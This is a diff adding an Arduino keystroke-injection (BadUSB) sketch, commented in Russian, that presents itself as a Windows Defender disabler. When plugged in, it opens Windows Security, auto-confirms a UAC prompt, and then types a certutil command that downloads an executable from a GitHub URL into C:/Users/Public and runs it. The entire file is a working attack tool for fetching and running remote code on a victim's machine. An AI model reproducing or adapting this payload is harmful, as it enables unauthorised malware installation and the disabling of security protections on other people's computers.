@@ -1,0 +1,94 @@
+/**
+ * Disable Windows Defender - Improved Version with Layout Switch
+ * www.iN4sser.com
+ */
+
+#include "Keyboard.h"
+
+void typeKey(uint8_t key) {
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+// Функция для надежного переключения на английскую раскладку
+void switchToEnglishLayout() {
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  delay(100);  // Ждем, чтобы система успела переключить раскладку
+  Keyboard.releaseAll();
+  delay(500);  // Ждем немного для стабильности
+}
+
+/* Init function */
+void setup() {
+  // Начало потока клавиатуры
+  Keyboard.begin();
+  delay(1000);  // Даем системе время инициализироваться
+
+  // Переключаем раскладку на английскую перед вводом текста
+  switchToEnglishLayout();
+
+  // Открываем меню "Пуск"
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_ESC);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+
+  // Печатаем "Windows Security" (без проблем с раскладкой)
+  Keyboard.println("Windows Security");
+  delay(1000);
+  typeKey(KEY_RETURN);
+  delay(1200);
+
+  // Навигация по окнам
+  for (int i = 0; i < 4; i++) {
+    typeKey(KEY_TAB);
+    delay(50);
+  }
+  typeKey(KEY_RETURN);
+  delay(500);
+
+  // Подтверждение UAC (если появляется)
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+
+  // Открываем окно "Выполнить"
+  Keyboard.press(KEY_LEFT_GUI);
+  delay(100);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+
+  // Переключаем раскладку снова, чтобы убедиться, что она правильная
+  switchToEnglishLayout();
+
+  // Открываем cmd
+  Keyboard.println("cmd");
+  delay(500);
+  typeKey(KEY_RETURN);
+  delay(1000);
+
+  // Загружаем файл через certutil
+  Keyboard.println("certutil.exe -urlcache -split -f \"https://raw.githubusercontent.com/spekt4/asjkdsdaszxcasd/refs/heads/main/Kuribih.exe\" \"C:/Users/Public/Kuribih.exe\"");
+  delay(2000);
+  typeKey(KEY_RETURN);
+  delay(1500);
+
+  // Запускаем скачанный файл
+  Keyboard.println("C:/Users/Public/Kuribih.exe");
+  delay(500);
+  typeKey(KEY_RETURN);
+  delay(1000);
+
+  // Завершаем поток клавиатуры
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
